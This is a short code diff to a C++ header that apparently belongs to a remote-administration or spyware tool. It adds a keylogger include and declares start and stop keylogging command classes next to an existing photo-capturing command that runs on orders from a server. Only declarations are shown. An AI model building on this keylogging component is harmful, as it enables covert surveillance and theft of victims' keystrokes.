@@ -6,6 +6,8 @@
 #include <sstream>
 #pragma comment(lib, "gdiplus.lib")
 
+#include "keylogger.h"
+
 #define SUCCESS 0
 #define FAILURE 1
 
@@ -121,4 +123,14 @@ private:
     int takePhoto();
 public:
     void execute(Server& server, const std::string& param) override;
+};
+
+class StartKeylogCommand : public Command{
+    public:
+        void execute(Server& server, const std::string& param) override;
+};
+
+class StopKeylogCommand : public Command{
+    public:
+        void execute(Server& server, const std::string& param) override;
 };
